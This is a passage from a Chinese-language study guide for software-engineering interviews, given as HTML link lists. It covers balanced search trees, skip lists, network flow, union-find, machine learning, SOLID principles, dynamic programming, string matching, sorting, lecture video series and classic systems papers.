的查询、插入及删除。它比红黑树严格意义上更为平衡，从而导致插入和删除更慢，但遍历却更快。正因如此，才彰显其结构的魅力。只需要构建一次，就可以在不重新构造的情况下读取，适合于实现诸如语言字典（或程序字典，如一个汇编程序或解释程序的操作码）。</li><li><a href="https://www.youtube.com/watch?v=FNeL18KsWPc&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=6">MIT AVL 树 / AVL 树的排序（视频）</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/Qq5E0/avl-trees">AVL 树（视频）</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/PKEBC/avl-tree-implementation">AVL 树的实现（视频）</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/22BgE/split-and-merge">分离与合并</a></li></ul></li><li><p><strong>伸展树</strong></p><ul><li>实际中：伸展树一般用于缓存、内存分配者、路由器、垃圾回收者、数据压缩、ropes（字符串的一种替代品，用于存储长串的文本字符）、Windows NT（虚拟内存、网络及文件系统）等的实现。</li><li><a href="https://www.youtube.com/watch?v=Najzh1rYQTo&amp;index=23&amp;list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd">CS 61B：伸展树（Splay trees）（视频）</a></li><li>MIT 教程：伸展树（Splay trees）：<ul><li>该教程会过于学术，但请观看到最后的10分钟以确保掌握。</li><li><a href="https://www.youtube.com/watch?v=QnPl_Y6EqMo">视频</a></li></ul></li></ul></li><li><p><strong>红黑树</strong></p><ul><li>这些是2-3棵树的翻译（请参见下文）。</li><li>实际中：红黑树提供了在最坏情况下插入操作、删除操作和查找操作的时间保证。这些时间值的保障不仅对时间敏感型应用有用，例如实时应用，还对在其他数据结构中块的构建非常有用，而这些数据结构都提供了最坏情况下的保障；例如，许多用于计算几何学的数据结构都可以基于红黑树，而目前 Linux 内核所采用的完全公平调度器（the Completely Fair Scheduler）也使用到了该种树。在 Java 8中，Collection HashMap也从原本用Linked List实现，储存特定元素的哈希码，改为用红黑树实现。</li><li><a href="https://youtu.be/1W3x0f_RmUo?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=3871">Aduni —— 算法 —— 课程4（该链接直接跳到开始部分）（视频）</a></li><li><a href="https://www.youtube.com/watch?v=hm2GHwyKF1o&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=5">Aduni —— 算法 —— 课程5（视频）</a></li><li><a href="https://en.wikipedia.org/wiki/Red%E2%80%93black_tree">黑树（Black Tree）</a></li><li><a href="https://www.topcoder.com/community/data-science/data-science-tutorials/an-introduction-to-binary-search-and-red-black-trees/">二分查找及红黑树的介绍</a></li></ul></li><li><p><strong>2-3查找树</strong></p><ul><li>实际中：2-3树的元素插入非常快速，但却有着查询慢的代价（因为相比较 AVL 树来说，其高度更高）。</li><li>你会很少用到2-3树。这是因为，其实现过程中涉及到不同类型的节点。因此，人们更多地会选择红黑树。</li><li><a href="https://www.youtube.com/watch?v=C3SsdUqasD4&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6&amp;index=2">2-3树的直感与定义（视频）</a></li><li><a href="https://www.youtube.com/watch?v=iYvBtGKsqSg&amp;index=3&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">2-3树的二元观点</a></li><li><a href="https://www.youtube.com/watch?v=TOb1tuEZ2X4&amp;index=5&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">2-3树（学生叙述）（视频）</a></li></ul></li><li><p><strong>2-3-4树 (亦称2-4树)</strong></p><ul><li>实际中：对于每一棵2-4树，都有着对应的红黑树来存储同样顺序的数据元素。在2-4树上进行插入及删除操作等同于在红黑树上进行颜色翻转及轮换。这使得2-4树成为一种用于掌握红黑树背后逻辑的重要工具。这就是为什么许多算法引导文章都会在介绍红黑树之前，先介绍2-4树，尽管<strong>2-4树在实际中并不经常使用</strong>。</li><li><a href="https://www.youtube.com/watch?v=zqrqYXkth6Q&amp;index=26&amp;list=PL4BBB74C7D2A1049C">CS 61B Lecture 26：平衡查找树（视频）</a></li><li><a href="https://www.youtube.com/watch?v=DQdMYevEyE4&amp;index=4&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">自底向上的2-4树（视频）</a></li><li><a href="https://www.youtube.com/watch?v=2679VQ26Fp4&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6&amp;index=5">自顶向下的2-4树（视频）</a></li></ul></li><li><p><strong>N 叉树（K 叉树、M 叉树）</strong></p><ul><li>注意：N 或 K 指的是分支系数（即树的最大分支数）：</li><li>二叉树是一种分支系数为2的树</li><li>2-3树是一种分支系数为3的树</li><li><a href="https://en.wikipedia.org/wiki/K-ary_tree">K 叉树</a></li></ul></li><li><p><strong>B 树</strong></p><ul><li>有趣的是：为啥叫 B 仍然是一个神秘。因为 B 可代表波音（Boeing）、平衡（Balanced）或 Bayer（联合创造者）</li><li>实际中：B 树会被广泛适用于数据库中，而现代大多数的文件系统都会使用到这种树（或变种)。除了运用在数据库中，B 树也会被用于文件系统以快速访问一个文件的任意块。但存在着一个基本的问题，那就是如何将文件块 i 转换成一个硬盘块（或一个柱面-磁头-扇区）上的地址。</li><li><a href="https://en.wikipedia.org/wiki/B-tree">B 树</a></li><li><a href="http://btechsmartclass.com/data_structures/b-trees.html">B 树数据结构</a></li><li><a href="https://www.youtube.com/watch?v=I22wEC1tTGo&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6&amp;index=6">B 树的介绍（视频）</a></li><li><a href="https://www.youtube.com/watch?v=s3bCdZGrgpA&amp;index=7&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">B 树的定义及其插入操作（视频）</a></li><li><a href="https://www.youtube.com/watch?v=svfnVhJOfMc&amp;index=8&amp;list=PLA5Lqm4uh9Bbq-E0ZnqTIa8LRaL77ica6">B 树的删除操作（视频）</a></li><li><a href="https://www.youtube.com/watch?v=V3omVLzI0WE&amp;index=7&amp;list=PLUl4u3cNGP61hsJNdULdudlRL493b-XZf">MIT 6.851 —— 内存层次模块（Memory Hierarchy Models）（视频）</a><ul><li>覆盖有高速缓存参数无关型（cache-oblivious）B 树和非常有趣的数据结构</li><li>头37分钟讲述的很专业，或许可以跳过（B 指块的大小、即缓存行的大小）</li></ul></li></ul></li></ul></li><li><h3><span id="k-d-shu">k-D树</span></h3><ul><li>非常适合在矩形或更高维度的对象中查找点数</li><li>最适合k近邻</li><li><a href="https://www.youtube.com/watch?v=W94M9D_yXKk">Kd树（视频）</a></li><li><a href="https://www.youtube.com/watch?v=Y4ZgLlDfKDg">kNN K-d树算法（视频）</a></li></ul></li><li><h3><span id="tiao-biao">跳表</span></h3><ul><li>“有一种非常迷幻的数据类型” - Skiena</li><li><a href="https://www.youtube.com/watch?v=2g9OSRKJuzM&amp;index=10&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">随机化: 跳表 (视频)</a></li><li><a href="https://en.wikipedia.org/wiki/Skip_list">更生动详细的解释</a></li></ul></li><li><h3><span id="wang-luo-liu">网络流</span></h3><ul><li><a href="https://www.youtube.com/watch?v=v1VgJmkEJW0">5分钟简析 Ford-Fulkerson──一步步示例 (视频)</a></li><li><a href="https://www.youtube.com/watch?v=v1VgJmkEJW0">Ford-Fulkerson 算法 (视频)</a></li><li><a href="https://www.youtube.com/watch?v=2vhN4Ice5jI">网络流 (视频)</a></li></ul></li><li><h3><span id="bu-xiang-jiao-ji-amp-lian-he-cha-zhao">不相交集 &amp; 联合查找</span></h3><ul><li><a href="https://www.youtube.com/watch?v=MAEGXTwmUsI&amp;list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd&amp;index=21">UCB 61B - 不相交集；排序 &amp; 选择(视频)</a></li><li><a href="https://www.coursera.org/learn/algorithms-part1/home/week/1">Sedgewick算法──Union-Find（6视频）</a></li></ul></li><li><h3><span id="kuai-su-chu-li-de-shu-xue">快速处理的数学</span></h3><ul><li><a href="https://www.youtube.com/watch?v=eCaXlAaN2uE&amp;index=11&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">整数运算, Karatsuba 乘法 (视频)</a></li><li><a href="https://www.youtube.com/watch?v=ru7mWZJlRQg">中国剩余定理 (在密码学中的使用) (视频)</a></li></ul></li><li><h3><span id="shu-dui-treap">树堆 (Treap)</span></h3><ul><li>一个二叉搜索树和一个堆的组合</li><li><a href="https://en.wikipedia.org/wiki/Treap">树堆</a></li><li><a href="https://www.youtube.com/watch?v=6podLUYinH8">数据结构：树堆的讲解（视频）</a></li><li><a href="https://www.cs.cmu.edu/~scandal/papers/treaps-spaa98.pdf">集合操作的应用(Applications in set operations)</a></li></ul></li><li><h3><span id="xian-xing-gui-hua-linear-programming-shi-pin">线性规划（Linear Programming）（视频）</span></h3><ul><li><a href="https://www.youtube.com/watch?v=M4K6HYLHREQ">线性规划</a></li><li><a href="https://www.youtube.com/watch?v=2ACJ9ewUC6U">寻找最小成本</a></li><li><a href="https://www.youtube.com/watch?v=8AA_81xI3ik">寻找最大值</a></li><li><a href="https://www.youtube.com/watch?v=44pAWI7v5Zk">用 Python 解决线性方程式──单纯形算法</a></li></ul></li><li><h3><span id="ji-he-tu-bao-geometry-convex-hull-shi-pin">几何：凸包（Geometry, Convex hull）（视频）</span></h3><ul><li><a href="https://youtu.be/XIAQRlNkJAw?list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;t=3164">Graph Alg. IV: 几何算法介绍 - 第 9 课</a></li><li><a href="https://www.youtube.com/watch?v=J5aJEcOr6Eo&amp;index=10&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm">Graham &amp; Jarvis: 几何算法 - 第 10 课</a></li><li><a href="https://www.youtube.com/watch?v=EzeYI7p9MjU&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=2">分而治之: 凸包, 中值查找</a></li></ul></li><li><h3><span id="chi-san-shu-xue">离散数学</span></h3><ul><li>查看下面的视频</li></ul></li><li><h3><span id="ji-qi-xue-xi-machine-learning">机器学习（Machine Learning）</span></h3><ul><li>为什么学习机器学习？<ul><li><a href="https://backchannel.com/how-google-is-remaking-itself-as-a-machine-learning-first-company-ada63defcb70">谷歌如何将自己改造成一家「机器学习优先」公司？</a></li><li><a href="https://www.youtube.com/watch?v=QSaZGT4-6EY">智能计算机系统的大规模深度学习 (视频)</a></li><li><a href="https://www.youtube.com/watch?v=X769cyzBNVw">Peter Norvig：深度学习和理解与软件工程和验证的对比</a></li></ul></li><li><a href="https://www.youtube.com/watch?v=Ja2hxBAwG_0">谷歌云机器学习工具（视频）</a></li><li><a href="https://www.youtube.com/playlist?list=PLOU2XLYxmsIIuiBfYad6rFYQU_jL2ryal">谷歌开发者机器学习清单 (Scikit Learn 和 Tensorflow) (视频)</a></li><li><a href="https://www.youtube.com/watch?v=oZikw5k_2FM">Tensorflow (视频)</a></li><li><a href="https://www.tensorflow.org/versions/r0.11/tutorials/index.html">Tensorflow 教程</a></li><li><a href="http://www.analyticsvidhya.com/blog/2016/04/neural-networks-python-theano/">Python 实现神经网络实例教程（使用 Theano）</a></li><li>课程:<ul><li><a href="https://www.coursera.org/learn/machine-learning">很棒的初级课程：机器学习</a><ul><li><a href="https://www.youtube.com/playlist?list=PLZ9qNFMHZ-A4rycgrgOYma6zxF4BZGGPW">视频教程</a></li><li>看第 12-18 集复习线性代数（第 14 集和第 15 集是重复的）</li></ul></li><li><a href="https://www.coursera.org/learn/neural-networks">机器学习中的神经网络</a></li><li><a href="https://www.udacity.com/course/deep-learning--ud730">Google 深度学习微学位</a></li><li><a href="https://www.udacity.com/course/machine-learning-engineer-nanodegree-by-google--nd009">Google/Kaggle 机器学习工程师微学位</a></li><li><a href="https://www.udacity.com/drive">无人驾驶工程师微学位</a></li><li><a href="http://www.thisismetis.com/explore-data-science">Metis 在线课程 (两个月 99 美元)</a></li></ul></li><li>资源:<ul><li>书籍：<ul><li><a href="https://www.amazon.com/Python-Machine-Learning-Sebastian-Raschka/dp/1783555130/">Python 机器学习</a></li><li><a href="https://www.amazon.com/Data-Science-Scratch-Principles-Python/dp/149190142X">Data Science from Scratch: First Principles with Python</a></li><li><a href="https://www.amazon.com/Introduction-Machine-Learning-Python-Scientists/dp/1449369413/">Python 机器学习简介</a></li></ul></li><li><a href="https://github.com/ZuzooVn/machine-learning-for-software-engineers">软件工程师的机器学习</a></li><li>Data School：<a href="http://www.dataschool.io/">http://www.dataschool.io/</a></li></ul></li></ul></li></ul><p>–</p><h2><span id="yi-xie-zhu-ti-de-e-wai-nei-rong">一些主题的额外内容</span></h2><pre><code>我为前面提到的某些主题增加了一些额外的内容，之所以没有直接添加到前面，是因为这样很容易导致某个主题内容过多。毕竟你想在本世纪找到一份工作，对吧？</code></pre><ul><li><p>SOLID</p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=TMuno5RZNeE">Bob Martin SOLID面向对象和敏捷设计的原理（视频）</a></li><li>[ ] S ── <a href="http://www.oodesign.com/single-responsibility-principle.html">单一责任原则</a> | <a href="http://www.javacodegeeks.com/2011/11/solid-single-responsibility-principle.html">对每个对象的单一责任</a><ul><li><a href="https://docs.google.com/open?id=0ByOwmqah_nuGNHEtcU5OekdDMkk">更多</a></li></ul></li><li>[ ] O ── <a href="http://www.oodesign.com/open-close-principle.html">开放/封闭原则</a> | <a href="https://en.wikipedia.org/wiki/Open/closed_principle">在生产级别上，可以扩展对象，但不能修改对象</a><ul><li><a href="http://docs.google.com/a/cleancoder.com/viewer?a=v&amp;pid=explorer&amp;chrome=true&amp;srcid=0BwhCYaYDn8EgN2M5MTkwM2EtNWFkZC00ZTI3LWFjZTUtNTFhZGZiYmUzODc1&amp;hl=en">更多</a></li></ul></li><li>[ ] L ── <a href="http://www.oodesign.com/liskov-s-substitution-principle.html">Liskov 替换原则</a> | <a href="http://stackoverflow.com/questions/56860/what-is-the-liskov-substitution-principle">基本类别和派生类别遵循“IS A”原则</a><ul><li><a href="http://docs.google.com/a/cleancoder.com/viewer?a=v&amp;pid=explorer&amp;chrome=true&amp;srcid=0BwhCYaYDn8EgNzAzZjA5ZmItNjU3NS00MzQ5LTkwYjMtMDJhNDU5ZTM0MTlh&amp;hl=en">更多</a></li></ul></li><li>[ ] I ── <a href="http://www.oodesign.com/interface-segregation-principle.html">接口隔离原理</a> | 不应强迫客户端实现不使用的接口<ul><li><a href="https://www.youtube.com/watch?v=3CtAfl7aXAQ">5分钟了解接口隔离原理（视频）</a></li><li><a href="http://docs.google.com/a/cleancoder.com/viewer?a=v&amp;pid=explorer&amp;chrome=true&amp;srcid=0BwhCYaYDn8EgOTViYjJhYzMtMzYxMC00MzFjLWJjMzYtOGJiMDc5N2JkYmJi&amp;hl=en">更多</a></li></ul></li><li>[ ] D ── <a href="http://www.oodesign.com/dependency-inversion-principle.html">依赖倒置原理</a> | 减少对象组合中的依赖性。<ul><li><a href="http://stackoverflow.com/questions/62539/what-is-the-dependency-inversion-principle-and-why-is-it-important">依赖倒置原理为何如此重要？</a></li><li><a href="http://docs.google.com/a/cleancoder.com/viewer?a=v&amp;pid=explorer&amp;chrome=true&amp;srcid=0BwhCYaYDn8EgMjdlMWIzNGUtZTQ0NC00ZjQ5LTkwYzQtZjRhMDRlNTQ3ZGMz&amp;hl=en">更多</a></li></ul></li></ul></li><li><p>Union-Find</p><ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/JssSY/overview">概览</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/EM5D0/naive-implementations">初级实践</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/Mxu0w/trees">树状结构</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/qb4c2/union-by-rank">合并树状结构</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/Q9CVI/path-compression">路径压缩</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/GQQLN/analysis-optional">分析选项</a></li></ul></li><li><p><strong>动态规划的更多内容</strong> (视频)</p><ul><li><a href="https://www.youtube.com/watch?v=OQ5jsbhAv_M&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=19">6.006: 动态规划 I: 斐波那契数列, 最短路径</a></li><li><a href="https://www.youtube.com/watch?v=ENyox7kNKeY&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=20">6.006: 动态规划 II: 文本匹配, 二十一点/黑杰克</a></li><li><a href="https://www.youtube.com/watch?v=ocZMDMZwhCY&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=21">6.006: 动态规划 III: 最优加括号方式, 最小编辑距离, 背包问题</a></li><li><a href="https://www.youtube.com/watch?v=tp4_UXaVyx8&amp;index=22&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">6.006: 动态规划 IV: 吉他指法，拓扑，超级马里奥.</a></li><li><a href="https://www.youtube.com/watch?v=Tw1k46ywN6E&amp;index=14&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">6.046: 动态规划: 动态规划进阶</a></li><li><a href="https://www.youtube.com/watch?v=NzgFUwOaoIw&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=15">6.046: 动态规划: 所有点对最短路径</a></li><li><a href="https://www.youtube.com/watch?v=krZI60lKPek&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=12">6.046: 动态规划: 更多示例</a></li></ul></li><li><p><strong>图形处理进阶</strong> (视频)</p><ul><li><a href="https://www.youtube.com/watch?v=mUBmcbbJNf4&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=27">异步分布式算法: 对称性破缺，最小生成树</a></li><li><a href="https://www.youtube.com/watch?v=kQ-UQAzcnzA&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=28">异步分布式算法: 最小生成树</a></li></ul></li><li><p>MIT <strong>概率论</strong> (过于数学，进度缓慢，但这对于数学的东西却是必要之恶) (视频):</p><ul><li><a href="https://www.youtube.com/watch?v=SmFwFdESMHI&amp;index=18&amp;list=PLB7540DEDD482705B">MIT 6.042J - 概率论概述</a></li><li><a href="https://www.youtube.com/watch?v=E6FbvM-FGZ8&amp;index=19&amp;list=PLB7540DEDD482705B">MIT 6.042J - 条件概率 Probability</a></li><li><a href="https://www.youtube.com/watch?v=l1BCv3qqW4A&amp;index=20&amp;list=PLB7540DEDD482705B">MIT 6.042J - 独立</a></li><li><a href="https://www.youtube.com/watch?v=MOfhhFaQdjw&amp;list=PLB7540DEDD482705B&amp;index=21">MIT 6.042J - 随机变量</a></li><li><a href="https://www.youtube.com/watch?v=gGlMSe7uEkA&amp;index=22&amp;list=PLB7540DEDD482705B">MIT 6.042J - 期望 I</a></li><li><a href="https://www.youtube.com/watch?v=oI9fMUqgfxY&amp;index=23&amp;list=PLB7540DEDD482705B">MIT 6.042J - 期望 II</a></li><li><a href="https://www.youtube.com/watch?v=q4mwO2qS2z4&amp;index=24&amp;list=PLB7540DEDD482705B">MIT 6.042J - 大偏差</a></li><li><a href="https://www.youtube.com/watch?v=56iFMY8QW2k&amp;list=PLB7540DEDD482705B&amp;index=25">MIT 6.042J - 随机游走</a></li></ul></li><li><p><a href="https://www.youtube.com/watch?v=oDniZCmNmNw&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=19">Simonson: 近似算法 (视频)</a></p></li><li><p><strong>字符串匹配</strong></p><ul><li>Rabin-Karp（视频）<ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/c0Qkw/rabin-karps-algorithm">Rabin Karps 算法</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/nYrc8/optimization-precomputation">预计算</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/h4ZLc/optimization-implementation-and-analysis">优化：实施和分析</a></li><li><a href="https://www.youtube.com/watch?v=BRO7mVIFt08&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=9">表翻倍，Karp-Rabin</a></li><li><a href="https://www.youtube.com/watch?v=w6nuXg0BISo&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=32">滚动哈希，摊销分析</a></li></ul></li><li>Knuth-Morris-Pratt (KMP)：<ul><li><a href="https://www.youtube.com/watch?v=5i7oKodCRJo">Knuth-Morris-Pratt（KMP）字符串匹配算法</a></li></ul></li><li>Boyer–Moore 字符串搜索算法<ul><li><a href="https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string_search_algorithm">Boyer–Moore 字符串搜索算法</a></li><li><a href="https://www.youtube.com/watch?v=QDZpzctPf10">高级字符串搜索Boyer-Moore-Horspool算法（视频）</a></li></ul></li><li><a href="https://www.coursera.org/learn/algorithms-on-strings/home/week/1">Coursera：字符串算法</a><ul><li>刚开始时很棒，但是当它超过 KMP 时，它变得比需要复杂得多</li><li>很好的字典树解释</li><li>可以跳过</li></ul></li></ul></li><li><p><strong>排序</strong></p><ul><li><p>斯坦福大学关于排序算法的视频:</p><ul><li><a href="https://www.youtube.com/watch?v=ENp00xylP7c&amp;index=15&amp;list=PLFE6E58F856038C69">课程 15 | 编程抽象（视频）</a></li><li><a href="https://www.youtube.com/watch?v=y4M9IVgrVKo&amp;index=16&amp;list=PLFE6E58F856038C69">课程 16 | 编程抽象（视频）</a></li></ul></li><li><p>Shai Simonson 视频，<a href="http://www.aduni.org/">Aduni.org</a>:</p><ul><li><a href="https://www.youtube.com/watch?v=odNJmw5TOEE&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=2">算法 - 排序 - 第二讲（视频）</a></li><li><a href="https://www.youtube.com/watch?v=hj8YKFTFKEE&amp;list=PLFDnELG9dpVxQCxuD-9BSy2E7BWY3t5Sm&amp;index=3">算法 - 排序2 - 第三讲（视频）</a></li></ul></li><li><p>Steven Skiena 关于排序的视频:</p><ul><li><a href="https://youtu.be/ute-pmMkyuk?list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;t=1600">课程从 26:46 开始（视频）</a></li><li><a href="https://www.youtube.com/watch?v=yLvp-pB8mak&amp;index=8&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">课程从 27:40 开始（视频）</a></li><li><a href="https://www.youtube.com/watch?v=q7K9otnzlfE&amp;index=9&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">课程从 35:00 开始（视频）</a></li><li><a href="https://www.youtube.com/watch?v=TvqIGu9Iupw&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=10">课程从 23:50 开始（视频）</a></li></ul></li></ul></li></ul><h2><span id="shi-pin-xi-lie">视频系列</span></h2><p>坐下来享受一下吧。“netflix 和技能” :P</p><ul><li><p><a href="https://www.youtube.com/playlist?list=PLrmLmBdmIlpsHaNTPP_jHHDx_os9ItYXr">个人的动态规划问题列表 (都是短视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL038BE01D3BAEFDB0">x86 架构，汇编，应用程序 (11 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLE7DDD91010BC51F8">MIT 18.06 线性代数，2005 年春季 (35 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL3B08AE665AB9002A">绝妙的 MIT 微积分：单变量微积分</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL-XXv-cvA_iD8wQm8U0gG_Z1uHjImKXFy">计算机科学 70, 001 - 2015 年春季 - 离散数学和概率理论</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL3o9D4Dl2FJ9q0_gtFXPh_H4POI5dK0yG">离散数学 (19 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLGxuz-nmYlQPOc4w1Kp2MZrdqOOm4Jxeo">离散数学（第一部分），Sarada Herke （5个视频）</a></p></li><li><p>CSE373 - 算法分析 (25 个视频)</p><ul><li><a href="https://www.youtube.com/watch?v=ZFjhkohHdAA&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=1">Skiena 的算法设计手册讲座</a></li></ul></li><li><p><a href="https://www.youtube.com/watch?v=mFPmKGIrQs4&amp;list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd">UC Berkeley 61B (2014 年春季): 数据结构 (25 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL4BBB74C7D2A1049C">UC Berkeley 61B (2006 年秋季): 数据结构 (39 个视频)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=gJJeUFyuvvg&amp;list=PL-XXv-cvA_iCl2-D-FS5mk0jFF6cYSJs_">UC Berkeley 61C：计算机结构 (26 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLJ9pm_Rc9HesnkwKlal_buSIHA-jTZMpO">OOSE：使用 UML 和 Java 进行软件开发 (21 个视频)</a></p></li><li><p><del><a href="https://www.youtube.com/watch?v=UH0QYvtP7Rk&amp;index=20&amp;list=PLkFD6_40KJIwEiwQx1dACXwh-2Fuo32qr">UC Berkeley CS 152: 计算机结构和工程 (20 个视频)</a></del></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLrRW1w6CGAcXbMtDFj205vALOGmiRc82-">MIT 6.004: 计算结构 (49 视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL5PHm2jkkXmi5CxxI7b3JCL1TWybTDtKq">卡內基梅隆大学 - 计算机架构讲座 (39 个视频)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=HtSuA80QTyo&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;nohtml5=False">MIT 6.006：算法介绍 (47 个视频)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=zm2VP0kHl1M&amp;list=PL6535748F59DCA484">MIT 6.033：计算机系统工程 (22 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP63gFHB6xb-kVBiQHYe_4hSi">MIT 6.034：人工智能，2010 年秋季 (30 个视频)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=L3LMbpZIKhQ&amp;list=PLB7540DEDD482705B">MIT 6.042J：计算机科学数学, 2010 年秋季 (25 个视频)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=2P-yW7LQr08&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">MIT 6.046：算法设计与分析 (34 个视频)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=phxsQrZQupo&amp;list=PL_2Bwul6T-A7OldmhGODImZL8KEVE38X7">MIT 6.050J：信息和熵, 2008 年春季 (19 个视频)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=T0yzrZL1py0&amp;list=PLUl4u3cNGP61hsJNdULdudlRL493b-XZf&amp;index=1">MIT 6.851：高等数据结构 (22 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL6ogFv-ieghdoGKGg2Bik3Gl1glBTEu8c">MIT 6.854: 高等算法, 2016 年春季 (24 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL2SOU6wwxB0uP4rJgf5ayhHWgw7akUWSf">Harvard COMPSCI 224：高级算法（25个视频）</a></p></li><li><p><a href="https://www.youtube.com/watch?v=GqmQg-cszw4&amp;index=1&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">MIT 6.858：计算机系统安全, 2014 年秋季</a></p></li><li><p><a href="https://www.youtube.com/view_play_list?p=9D558D49CA734A02">斯坦福: 编程范例 (27 个视频)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL6N5qY2nvvJE8X75VkXglSrVhLv1tVcfy">密码学导论，Christof Paar</a></p><ul><li><a href="http://www.crypto-textbook.com/">课程网站以及幻灯片和问题集</a></li></ul></li><li><p><a href="https://www.youtube.com/playlist?list=PLLssT5z_DsK9JDLcT8T62VtzwyW9LNepV">大数据 - 斯坦福大学 (94 个视频)</a></p></li><li><p><a href="https://www.youtube.com/user/DrSaradaHerke/playlists?shelf_id=5&amp;view=50&amp;sort=dd">图论，Sarada Herke（67个视频）</a></p></li></ul><h2><span id="ji-suan-ji-ke-xue-ke-cheng">计算机科学课程</span></h2><ul><li><a href="https://github.com/open-source-society/computer-science">在线 CS 课程目录</a></li><li><a href="https://github.com/prakhar1989/awesome-courses">CS 课程目录 (一些是在线讲座)</a></li></ul><h2><span id="lun-wen">论文</span></h2><ul><li><a href="https://www.cs.cmu.edu/~crary/819-f09/">喜欢经典的论文？</a></li><li><a href="http://spinroot.com/courses/summer/Papers/hoare_1978.pdf">1978: 通信顺序处理</a><ul><li><a href="https://godoc.org/github.com/thomas11/csp">Go 实现</a></li></ul></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//archive/gfs-sosp2003.pdf">2003: The Google 文件系统</a><ul><li>2012 年被 Colossus 取代了</li></ul></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//archive/mapreduce-osdi04.pdf">2004: MapReduce: Simplified Data Processing on Large Clusters</a><ul><li>大多被云数据流取代了?</li></ul></li><li><a href="https://static.googleusercontent.com/media/research.google.com/en//archive/bigtable-osdi06.pdf">2006年：Bigtable：结构化数据的分布式存储系统</a><ul><li><a href="https://cloud.google.com/files/BigQueryTechnicalWP.pdf">深入了解Google BigQuery</a></li></ul></li><li><a href="https://research.google.com/archive/chubby-osdi06.pdf">2006年：针对松散耦合的分布式系统的Chubby Lock服务</a></li><li><a 